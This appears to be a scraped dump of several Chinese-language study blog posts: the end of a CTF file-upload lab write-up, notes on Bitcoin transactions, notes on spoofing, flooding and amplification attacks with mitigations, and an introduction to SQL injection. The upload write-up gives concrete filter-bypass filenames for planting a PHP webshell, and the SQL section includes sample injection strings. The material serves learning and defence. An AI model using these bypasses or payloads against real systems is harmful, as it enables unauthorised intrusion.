最后尝试解析和使用，成功 尝试了很多不同的图片，感觉就像国光师傅总结的那样，图片越大，payload越小越容易成功，因为之前上传了很多小的图片，一句话木马都被截断了，猜测可能是因为图片太小，同时一句话木马太长了占用关键的部分所以被替换了 大图片 短payload 先上传二次渲染之后，再执行脚本，再上传 move_uploaded_file 绕过 我们看一下源码先 发现是一个白名单，那么肯定又需要利用一些有漏洞的方法或者操作系统的特殊机制了 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); $file_name = $_POST[\u0026#39;save_name\u0026#39;]; $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } 这里的漏洞在Smile师傅的笔记中有提到，即 move_uploaded_file 会忽略/. 那么我们通过构造文件名为 trojan.php/. 即可绕过白名单，同时使webshell被正常解析 蚁剑连接成功 代码审计 因为是代码审计，我们直接来看代码 $is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //检查MIME $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;禁止上传该类型文件!\u0026#34;; }else{ //检查文件名 $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;禁止上传该后缀文件!\u0026#34;; }else{ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;文件上传成功！\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;文件上传失败！\u0026#34;; } } } }else{ $msg = \u0026#34;请选择要上传的文件！\u0026#34;; } 我们接着一块块来看源码中的审核机制以及我们对应的绕过 检查 MIME,因此我们需要在Burp中修改 MIME 类型 $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;禁止上传该类型文件!\u0026#34;; 检查我们提交的 save_name 字符串是否为空，有内容的话使用我们自定义的文件保存名，接着检查是否为数组，如果不是的话就要使用 explode() 方法将内容用 ‘.’ 分隔为数组（感觉和其他语言中的 split() 方法很像） explode() explode(string $separator, string $string, int $limit = PHP_INT_MAX): array Returns an array of strings created by splitting the string parameter on boundaries formed by the separator. $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } 接着取出数组最后一个元素进行后缀名校验 end() end(array|object \u0026amp;$array): mixed Returns the value of the last element or false for empty array. $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;禁止上传该后缀文件!\u0026#34;; } 我们可以通过在 save_name 这个变量处传入一个数组，使最后一个元素为白名单的图片格式，再想办法在最后的存储的时候，让最后一个元素的内容无效就行了 $file = [0=\u0026gt;\u0026#39;shell.php/\u0026#39;, 2=\u0026gt;\u0026#39;png\u0026#39;] reset() reset(array|object \u0026amp;$array): mixed Returns the value of the first array element, or false if the array is empty. 最后因为这里会拼接一个 '.' ，因此与之前的 '/' 构成我们上一关提到的 move_uploaded_file 的漏洞，即 /. 末尾的内容会被忽略，即可完成绕过，上传成功 $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; 上传成功使用蚁剑连接成功 ","date":"2022-04-27T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/file_upload_ggctf_upload/","title":"File Upload: ggctf-upload"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt; Mastering Bitcoin 2nd Edition Chapter 6: Transaction \u0026ldquo;Transactions are the most important part of the bitcoin system. Everything else in bitcoin is designed to ensure that transactions can be created, propagated on the network, validated, and finally added to the global ledger of transactions (the blockchain).\u0026rdquo; 第六章的开篇又提到了Transaction 的重要性，可以说就是为了保证Transaction 能够成功，才创造了其他一系列的技术支持。在第二章中，我们已经大致明白了transaction 是怎样工作的了，在第六章中，我们将介绍其中的细节。 先贴一个Transaction 在这里，之后我们慢慢展开讲其中所包含的信息 { \u0026#34;version\u0026#34;: 1, \u0026#34;locktime\u0026#34;: 0, \u0026#34;vin\u0026#34;: [ { \u0026#34;txid\u0026#34;: \u0026#34;7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18\u0026#34;, \u0026#34;vout\u0026#34;: 0, \u0026#34;scriptSig\u0026#34; : \u0026#34;3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204 b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d1 72787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf\u0026#34;, \u0026#34;sequence\u0026#34;: 4294967295 } ], \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.01500000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; }, { \u0026#34;value\u0026#34;: 0.08450000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34;, } ] } Transaction Outputs and Inputs 这里我们直接引入一个新的概念： UTXO (Unspent transaction outputs) 未被花费的outputs，他具有discrete and indivisible 两个特性，就像物理货币一样，每一个硬币，每一张钞票，你在消费的时候，不能把它拆开来使用一样，并且一旦用出，你得到的找零也是其他的货币。 所有的Transaction整个过程中都是涉及到UTXO Received Bitcoin Wallet 通过检测整一个bitcoin network, 发现有与当前钱包所控制的bitcoin address 相关的UTXO 存在 Bitcoin Balance Wallet 对所有这些检测到的可以使用的UTXO 做一个总和，就是当前的余额balance Spend UTXO 将多个UTXO 汇总/直接使用一个大额度的UTXO 差值作为找零生成新的UTXO 返回钱包 这同时也代表着新的UTXO 的产生 不同大小的UTXO的不断汇总，分散，但是形成了一条chain Coinbase transaction 先有鸡，还是先有蛋的问题，最找的UTXO 从哪里来的呢？ 这里就要引入一个新的概念coinbase transaction 也就是每个block由miner创造的一个特殊的transaction， 包含了创造新的block 的奖励以及所有的transaction fees，这个就是最初始产生的UTXO Transaction Outputs \u0026ldquo;Every bitcoin transaction creates outputs ,which are recorded on the bitcoin ledger.\u0026rdquo; Transcation outputs 由两部分组成 一定数量的bitcoin, 用 satoshis 来表示 一个密码学题目，用来决定如果使用这个output (A cryptographic puzzle: locking script, witness script, or a scriptPubKey) 此时我们再回过头来之前transcation的内容，value out部分就很好理解了，就是用 satoshis 表示的一部分value 以及用scriptPubkey表示的一个 puzzle, 我们之后会讲到如何lock+unlock 这个scriptPubKey \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.01500000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; }, { \u0026#34;value\u0026#34;: 0.08450000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34;, } ] Transaction serialisation \u0026ndash; outputs 我们知道所有的Transaction 都会在整个bitcoin network中传递，同时也会被保存在各个节点上(bitcoin libraries) 那么为了传输以及保存的方便，就有了两种形式： 第一种就是我们之前见到过的用数据结构进行存储 第二种就是转换成byte stream 的形式，方便用于网络的传输 他们之前的转换就被我们称为序列化serialisation 以及反序列化 deserialisation 数据结构 -\u0026gt; byte-stream: serialisation byte-stream -\u0026gt; 数据结构：deserialisation Transaction Inputs Transaction inputs 制定了哪些UTXO 将要被用到本次transaction 当中，并为其提供unlocking script的proof of ownership 当wallet开始进行一次transaction 的时候，它会从该wallet 所控制的所有UTXO中选择符合要求的，一定数量的UTXO 来进行 Transaction Inputs 包含两个部分 一个指向对应的一个 UTXO 的指针 （通过这个指针，包括hash id \u0026amp; sequence number, 我们可以在blockchain上找到这个UTXO 对应的信息） 一个 unlocking script （用于满足UTXO的 locking script的使用条件） 我们继续通过之前的例子来看transaction inputs \u0026#34;vin\u0026#34;: [ { \u0026#34;txid\u0026#34;: \u0026#34;7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18\u0026#34;, \u0026#34;vout\u0026#34;: 0, \u0026#34;scriptSig\u0026#34; : \u0026#34;3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204 b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d1 72787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf\u0026#34;, \u0026#34;sequence\u0026#34;: 4294967295 } ] 这条 Inputs 的记录包含了四个部分： Transaction ID 指向了我们需要的UTXO所对应的Transaction Output index (vout) 用于指示对应的那个Transaction中我们需要的UTXO 记得我们之前提到的不同forms的transaction吗，其中有一种就是存在很多的outputs，也就是生成了很多新的UTXO, 我们需要指出我们本次需要的具体是哪一个 scriptSig，用于unlock对应UTXO的locking script sequence number 细心的人可能会发现，在这条关于inputs的记录中似乎少了点什么，作为一个转账记录，它缺少最重要的东西，就是“多少钱” 完全没有bitcoin value 以及 locking script的信息 这也是作者提醒各位开发者的信息，每次在处理transaction 特别是inputs的时候，我们都需要利用 Transaction ID 去主动去获取对应的 UTXO 的信息(getrawtrasaction and decoderawtrasaction) 比如以这条记录为例，查询到的结果就是 \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.10000000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; } ] Transaction serialization—inputs Transaction inputs的存储和传输同样也需要用到序列化和反序列化 Transaction fee 设置transaction fee 的目的？ 给予miners记账的奖励 通过设置transaction fee 其实带来的是一个安全机制，也就是说attackers 不同通过大量的transaction来flood网络，因为这样会产生大量的消耗 如何决定 transcation fee 的数量？ 最开始是恒定的 后来开始可以自由设置 Transaction fee 的多少有什么影响 Transaction fee的数量直接决定了对应的这个 transaction 被处理的优先级，数量越多，就更有可能被包含在下一个block中 相对的，如果你设的越低，或者根本不设，很可能会因为best-effort而被放到很后面来执行，甚至根本永远都不会被处理 Adding Fees to Trasactions 我们观察之前的transaction的数据结构，里面并没有任何的变量指向transaction fee，那么其实这里是需要提前自行从找零的charge中扣除一部分的bitcoin value，如果忘记做了这一点，就会把整一个charge付给miner。当我们主动扣除之后，那么在后期结算的时候，就可以发现有一些未被分配的bitcoin value，这些就会被当作是transaction fee。 Fees = Sum(Inputs) – Sum(Outputs) 就如下图的一次transaction一样，我们可以看到右侧的outputs中，综合为0.995 BTC，也就是扣除了transaction fee之后的结果 Transaction validation 在这一章，我们来具体讲讲每一个transaction要如何得到验证，我们先再来回顾一下构成一个transaction所需要的inputs和outputs是由什么组成的。 Transaction Inputs 包含两个部分 一个指向对应的一个 UTXO 的指针 （通过这个指针，包括hash id \u0026amp; sequence number, 我们可以在blockchain上找到这个UTXO 对应的信息） 一个 unlocking script （用于满足UTXO的 locking script的使用条件） Transcation outputs 由两部分组成 一定数量的bitcoin, 用 satoshis 来表示 一个密码学题目，用来决定如果使用这个output (A cryptographic puzzle: locking script, witness script, or a scriptPubKey) 我们可以观察到他们都包含了一个概念叫做 script ，中文我们一般翻译为脚本，意思是一段可以执行的指令，一开始我接触这个概念的时候我也觉得很奇怪，为什么要在inputs和outputs中放脚本呢，他们又要如何运行呢，我们接着一起来来看。 先说结论，这些脚本确实可以运行， unlocking script 以及 locking script 结合在一起，可以组成简单的计算，得到 True / False 的结果来决定本次 transaction 是否成立，如果成立，那么 UTXO 将会被 spent 也就从 UTXO set 中被移除了。 Pay-to-Public-Key-Hash script A locking script is a spending condition placed on an output also called scriptPubKey, witness script, crytographic puzzle it usually contained a public key or bitcoin address (public key hash) A unlocking script is a script that \u0026ldquo;solves,\u0026rdquo; or satisfies, the conditions placed on an output by a locking script and allows the output to be spent also called scriptSig contain a digital signature produced by the user\u0026rsquo;s wallet from his or her private key 我们用之前Alice在Bob的咖啡馆买咖啡的例子来演示具体需要如何来验证一次transaction: Alice发起了一次付款，她使用自己钱包中的UTXO作为inputs，然后产生一个output给咖啡馆，一个output作为找零返回给自己 发给咖啡馆的transaction output将会包含一个locking script如下: OP_DUP OP_HASH160 \u0026lt;Cafe Public Key Hash\u0026gt; OP_EQUALVERIFY OP_CHECKSIG OP开头的字符串都表示script指令，那么这一串locking script就包含了一系列的指令和咖啡馆的public key hash 当Bob的咖啡馆需要消费这个input(UTXO)的时候，就需要利用它的unlocking script来解锁之前的locking script,其中应该包含两个部分 \u0026lt;Cafe Signature\u0026gt; \u0026lt;Cafe Public Key\u0026gt; 那么当locking script和unlocking script拼接在一起的时候，就组成了一个完整的脚本 \u0026lt;Cafe Signature\u0026gt; \u0026lt;Cafe Public Key\u0026gt; OP_DUP OP_HASH160 \u0026lt;Cafe Public Key Hash\u0026gt; OP_EQUALVERIFY OP_CHECKSIG 如果验证的结果为TRUE的话就验证成功了 我们可以看看具体的验证过程，这里的脚本语言是基于stack栈实现的： 将signature压入栈 将Public key压入栈 使用DUP指令来复制栈顶的内容并压入栈 使用HASH160来处理栈顶的内容并将结果压入栈HASH160(PubK) = \u0026lt;PubKHash\u0026gt; 将原本locking script中的\u0026lt;PubKHash\u0026gt;压入栈 使用指令EQUALVERIFY来比较栈顶的两个 \u0026lt;PubKHash\u0026gt; 是否相等，如果相等，则全部移出栈 最后使用指令CHECKSIG来验证 \u0026lt;PubK\u0026gt; 与 \u0026lt;sig\u0026gt; 是否匹配（本质上判断是不是一对public key 和 private key），如果匹配成功，返回True，验证成功 这里附带一个 Bitcoin Address 的产生过程 ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_6/","title":"Mastering Bitcoin 2nd Edition Chapter 6: Transactions"},{"content":"Spoofing, flooding and amplification Spoofing ARP spoofing ARP\nLayer identifiers\nRouting是network communication中重要的一环，computer node在通信之前，需要知道自己在与谁联系，要通过什么路径去联系 那么layer identifier 就代表着每一个computer node Internet Layer identifier: IP address (assigned by users or by software, such as DHCP) Link Layer Identifier: MAC Address (hardware address, physical address) ARP (Address Resolution Protocol)\naims to translate from IP address to MAC address ARP request message generation\n当有IP packet需要发出的时候，ARP就会被hardware driver 所调用 首先获取IP destination address 然后在ARP本地的 translation table 中查找是否有对应得IP address : MAC address entry 有的话，就把48-bits的MAC address发送给 hardware driver 没有的话，就准备发送ARP请求，填充相关信息 sender MAC address sender IP address target IP address target MAC address (broadcast address: 00:00:00:00:00:00) ARP request message在link layer被封装成frame 然后发送出去 ARP request message reception\n目标节点将会回复其所包含的MAC address, （如果通信的是其他网络的节点，那么此处寻找的就是网关的MAC address) 其他收到请求的节点会更新他们的 translation table (IP address : MAC address entry) 然后丢弃这个包 ARP rely message reception\nARP rely 是单播，会直接发送回发送者 ARP translation table (ARP table, ARP cache)\n通过ARP cache 来保存IP address : MAC address entry 来节省空间 表内的entry会 ageing ARP 是无状态协议，因此只要收到了request/reply 他们就会自动更新 RARP (Reverse ARP)\naims to translate from MAC address to IP address ARP spoofing attack\nARP spoofing主要的目的就是污染原本的ARP cache，将Computer A存放的关于 Computer B的信息，改为attacker的，这样A在给B发frame的时候，就会发给attacker countermeasure\n设置 Arp cache 的过期时间, expire 一些系统通过unicast 来更新cache 表，而不是像之前那样无状态的更新 Against countermeasure Attacker可以通过定期发送 ARP spoof packet (every ~40s) 来避免以上方法 Static ARP table 静态ARP表 每次启动加载到RAM中 没有ARP request主动发送 Man-in-the-middle attack with ARP spoofing\n通过ARP spoofing 污染两/多台电脑的 ARP cache ，使他们的通信destination都指向attacker，从而截取通信内容(attacker node 进而转发通信，因为它知道IP address所对应的正确的MAC address) MAC flooding\n每个switch 会内置一个 CAM (Content Addressable memory) 表，用于记录不同的MAC address所对应的port number 每当有frame 经过 switches, switch就会通过这个 table 来实现转发 MAC flooding就是使用大量的spoofed frame来填充switch 的转发表，从而占满 switch 所有的内存空间，使正常的frame的转发策略无法加入table，最终就会导致正常的frame 通信因为没有对应的port而 被迫广播 ，使attacker可以利用sniffer所监听到。 DHCP spoofing DHCP (Dynamic Host Configuration Protocol)\nDHCP是用来自动的给其他的用户分配IP地址以及其他相关配置的（网关，DNS服务器等）协议 Protocol operations : 1. Discovery - client 广播 DHCP Discovery message 来寻找server 2. Offer server单播提供IP给client 3. Request client 发送接收IP的message 4. Acknowledge server确认client愿意接受并发送IP以及其他的配置信息 \u0026lt;br/\u0026gt; DHCP spoofing attack\nDHCP spoofing 主要是通过向DHCP server发送大量的 Spoofed DHCP request message 来 占用 IP池里的所有可分配的IP，然后再使用一台假的DHCP server来回复client所发出的DHCP discovery message，进而控制这些client的IP以及其他配置（网关，DNS server地址）。 正常的DHCP request message： Spoofed DHCP discovery message: 利用大量虚假的MAC地址来占用可分配的IP地址 DHCP starvation :\n通过发送大量的带有伪造MAC Address的DHCP request message来占用所有的IP池中的IP地址，进而使用假的DHCP server给其他client分配地址和其他配置信息，对他们进行控制 Flooding and Amplification ICMP Smurfing ICMP\nPing : 提到ICMP协议，就不得不提到ping，ping就类似于一个声纳系统，通过向特定的电脑发送 ICMP ECHO_REQUEST ，来使他们通过返回 ECHO_REPLY_REQUEST 来验证是否可以通信 ICMP Smurfing\nAttacker通过向一个局域网的广播域中发送大量的 spoofed ICMP ECHO_REQUEST 来诱导大量的clients发送 ICMP ECHO_REPLY_REQUEST 到指定的一台client进而使其崩溃 Amplification : 我们从上面的例子可以看到，通过一个简单的广播，就可以让这么多的client进而产生巨大的流量，进而就催生出一个新的技术就是 Amplification ,可以通过多层的amplifiers来实现巨大的DDoS流量 \u0026lt;br/\u0026gt; NTP Amplification DDoS Attack NTP\nNetwork time protocol UDP protocol port 123 NTP用来用来各个主机的时钟 NTP是一个分层的，中间层的时间资源系统 每一层我们称为 stratum ,由最上层的clock一层层同步到不同 stratum 的NTP server NTP如何工作\nClient首先发出NTP message，并且在上面记录当前的时间戳： T1=9:00:00am NTP server 收到后马上打上时间戳： T2=10:00:01am NTP sever返回一条NTP message，然后在发出之前打上时间戳： T3=10:00:02am NTP message到达用户的时候马上打上时间戳： T4=9:00:03am 用这四个时间戳，我们就足以同步client的时间 Timestamp Value Description T1 09:00:00 Client发出的时间 T2 10:00:01 Server收到的时间 T3 10:00:02 Server发出的时间 T4 09:00:03 Client收到的时间 计算所有的Message在传输中delay的时间 delay = D1 - D2 = (T4-T1) - (T3-T2) = 通信花费的总时长 - 在server上的处理时间 = 3 - 1 = 2 seconds 计算 NTP client 与NTP server 之间的时间差 O1 = T2 - T1 = 1h 1s O2 = T3 - T4 = 59min T2 = T1 + offset + delay/2 T4 = T3 - offset + delay/2 因此Offset = (O1 + O2)/2 = [(T2 - T1 - delay/2) + (T3 - T4 + delay/2)] / 2 = 1 hour 总之就是 (=服务端的两个时间 - 客户端的两个时间 =)/2 = offset NTP amplification attack\nNTP amplification attack 依赖于利用公共可以访问的 NTP server 来发出NTP RESPONSE实现对victim host的DDoS攻击 补充知识 : NTP 服务支持管理员向NTP server查询其所管理同步的clients信息，NTP servers通过向client发送monlist命令来获得所有最近连接过的hosts的列表 ntpd : NTP daemon是一个操作系统的后台驻留程序，用来设置和维护系统时间并与NTP server交互实现时钟同步 在Ntpd在4.2.7之前的版本都是存在漏洞的。 在老的机器中，monlist command是默认开启的,它将会返回最近600个通信过的client的IP地址（也就是说一条monlist command，可以返回比原本大的多的数据） How NTP amplification attack works?\nAttacker使用bot来伪造NTP request packets，使用victim的IP地址 Botnet 发送这些伪造的NTP请求，来诱使NTP servers调用他们的monlist命令，返回大量的response Client收到了每一个NTP server所返回的600个IP地址的信息，相当于收到了一次DoS攻击。我们根据上面Wireshark的截图可以观察到，一条的spoofed NTP request只需要234bytes，但是却要受到100个482 bytes的数据包，可见其攻击力度。 Botnet 我们之前在NTP amplification attack已经提到过了bot的使用，在这一章节中，我们来稍微展开讲一讲Botnet的内容 Botnet，僵尸网络，简单来说就是黑客通过控制一系列的设备（主机，手机，IoT设备等），实现对于本机信息的获取以及控制权，可以利用所感染的bot或者僵尸来实现各种攻击，并通过C\u0026amp;C(command and control) server来实现通信与指令下发 如何搭建一个Botnet?\n黑客首先需要得到一群受感染的用户设备，他们可以自己想办法去感染，也可以从地下市场购买别人感染的 然后，让这些被感染的bots去连接上 C\u0026amp;C server,实现通信与管理 接着，黑客就可以通过C\u0026amp;C server来下达指令，要求Bot去偷取本机的信息，亦或者是配合实现攻击 TCP SYN Flooding TCP\nTCP 是一个传输层的协议，用于很多我们耳熟能详的协议例如HTTP, SMTP 还有 ftp TCP 提供了可靠的点对点的基于连接的通信，如果说网络层的IP地址是提供了快递从揽货到送达的路径，那么传输层的TCP和UDP相当于是提供了传输路上的保险 其可靠性主要是通过 segment sequencing, re-trasmission and loss detection 来实现的 同时TCP提供了流量控制和拥塞管理的功能，只要是通过滑动窗口算法以及丢包检测实现的 TCP connection\n每一个 TCP connection 的标识符就是： Source IP address + port number Destination IP address + port number 其中Port number指代的就是所跑的服务所对应的number Three-way handshake 三次握手协议\n之前我们提到过TCP协议是基于连接的协议，那么三次握手协议，就是其内置的，用于建立连接的协议 首先我们先来认识一下一个用于三次握手协议的TCP header应该包含什么信息 其应该包括： Port numbers (16 bits each) SYN flag (1 bit) ACK flag (1 bit) Sequence number (32 bits) Acknowledgement number (32 bits) 然后看一个具体的例子 Source首先发起第一次握手请求，名为 SYN 发出其所定义的一个sequence number为 x 接着Destination返回第二次握手请求，名为 SYN+ACK ，将sequence number改为其所定义的值 y ，并将acknowledge number设为 x+1 最后Source发起第三次握手请求，名为 ACK , 返回acknowledgement number为 y+1 , 同时递增自己的 sequence number为 x+1 至此三次握手连接成功，接下来就可以正常的进行通信，并且Source 和 Destination 将逐渐递增其自己的 sequence number 以及 acknowledge number TCP SYN flooding\nTCP SYN flooding attack本质上是一个DoS attack, 其目的是为了通过向目标服务器发送大量的无效 SYN, 来诱使服务器发送对等数量的 SYN+ACK 请求, 继而等待 ACK 请求回复，同时利用本地缓存这个连接，最终导致本地的缓存空间被占满。 我们最后通过一个具体的例子来复现一下这个过程 首先黑客向服务器发送大量的 SYN 请求,用的是伪造过的IP地址 接着服务器在收到了 SYN 请求之后，便会发出对应的 SYN+ACK 回复请求到之前伪造的IP地址 被伪造的IP地址的主机收到由服务器发来的大量 SYN+ACK 请求，可发现没有记录显示自己之前有发送过 SYN 请求到该服务器，因此不会回复 ACK 请求。同时，每维护一个等待 ACK 的连接，服务器都要开设一个新的端口，同时用缓存保存这些信息，一旦超出上限，那么就会使服务器瘫痪 Mitigation MAC flooding mitigation 使用port security，限制从端口可以获取的MAC地址数量 对安全的MAC地址进行长时间的使用（不可替代），只要这些地址还存在于第三层的设备的ARP table当中（例如路由器，表示信任路由器的安全措施） 使用AAA(Authentication, authorisation and accounting)服务器来验证所有MAC地址 DHCP starvation mitigation 使用Port security, 只有可以信任的端口所连接的DHCP请求才被允许通过 DHCP snooping, 只接受信任的DHCP服务器所发送的配置 DHCP spoofing mitigation 使用入侵检测系统，并审核数字签名来避免伪造的DHCP服务器 DHCP snooping, 只接受信任的DHCP服务器所发送的配置 ICMP smurfing mitigation 单独配置每一个主机和路由器，拒接相应ICMP请求和广播信息 配置路由器不要转发ICMP到广播域当中 入站流量检查，拒绝伪造源地址的数据 NTP amplification DDoS mitigation 禁止 monlist 的使用，一次来避免NTP返回非常大的信息 入站流量检查，拒绝伪造源地址的数据 Firewall TCP SYN flooding attack mitigation 使用防火墙来进行filtering，对那些很明显的spoofed的IP address进行丢弃 减少SYN接受的时间，将那些黑客建立的半连接尽早关闭来防止崩溃 使用防火墙对于TCP connection来进行审查 ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_3_spoofing_flooding_and_amplification/","title":"NSE Week 3: Spoofing, flooding and amplification"},{"content":"SQL注入：基础 简单来说，SQL注入就是attackers通过对客户端发出的HTTP请求的修改，在服务端执行他们想要的SQL操作。 （本篇用于基础概念的归纳总结，可能不太适合新手学习） 1. SQL注入产生的原因 Missing or improper input validation (用户输入检查的缺乏或者不够完善) Application-generated queries containing user-fed input (应用进行SQL查询，其结果能够反馈用户之前的不恰当输入) 2. SQL注入的注入点(Sinks)和目标(targets) 2.1 Sinks SQLi sinks 表示可能存在的注入点 GET/POST parameters Every HTTP header Cookies Database itself 以上所有的这些内容，都可以轻松的被用户所修改，他们也都有可能被用于服务端的数据库查询操作中，因此都需要严肃对待 2.2 Targets Target Description 识别可注入的变量 查找注入点（以上全是） 数据库信息 什么数据库？什么版本的数据库 数据库结构 库名，表名，列名，列类型，读写权限等 获取数据 爆库 数据修改 insert, update, delete操作 DOS LOCK，DELETE 操作来破坏数据库的Availability阻止用户正常访问应用 绕过验证 绕过登陆注册等一系列检查 远程指令注入 远程控制数据库 3. 注入的技巧 判断注入点 : 输入的内容，能否让页面产生异常的行为 SQL报错信息 页面内容的非正常显示 (e.g. 没有内容显示) 页面响应时间变化 闭合异常 : 如果说第一步的目的是为了让服务端的SQL查询语句出错，那么第二步就是为了在此基础上让SQL语句可以再次被正常解析 判断注入的类型 : 尝试不同类型的注入payload，观察存在哪种注入 修改SQL语句语义 : 修改语义，让数据库执行我们想要的操作 获取数据 : 爆库获得数据 这些操作也就对应了SQL注入的三要素: 所有HTTP请求的内容是否进行了严格的校验 是否可以重新闭合注入点的语句错误，使其可以被重新正常解析 语句是否可以被恶意修改 4. SQL注入对于安全的影响(CIA) Confidentiality 查看其他人的隐私信息 无授权地访问他人的账号 Integrity 修改数据库的数据：工资，成绩等 Availabity 删库跑路 修改账户信息：密码 删除日志 5. 如何防御SQL注入 i. 使用预编译语句 Prepared statement 顾名思义，就是将SQL语句提前编译，即其最终要执行的操作已经定了，唯一缺少的就是参数，其 语义 不会再受影响，这也是防御SQL注入的最佳手段 ii. 检查数据类型 对于需要获取的 参数 进行严格的 类型/格式检查 ，可以从很大程度上防御SQL注入 (数据类型，邮箱格式，日期格式等) iii. 使用安全函数 随着安全得到越来越多的重视，编程语言也在不断更新更为安全的函数和机制用于抵御一些常见的攻击 6. 常见的注入类型 String SQLi 注入点原本需要的是字符串 SELECT * FROM user_data WHERE first_name = \u0026#39;John\u0026#39; AND last_name = \u0026#39;\u0026#39; OR \u0026#39;1\u0026#39; = \u0026#39;1\u0026#39; Numberic SQLi 注入点原本需要的是数字 SELECT * FROM user_data WHERE Login_Count = 1 AND userid = 1 OR 1 = 1 Union query SQLi 利用SQL Union 关键词来实现额外的语义拼接 \u0026lt;?php $q = \u0026#34;SELECT id, name, price, description\u0026#34;. \u0026#34;FROM product WHERE category=\u0026#34;.$_GET[\u0026#39;cat\u0026#39;]; ?\u0026gt; 拼接一条查询语句： 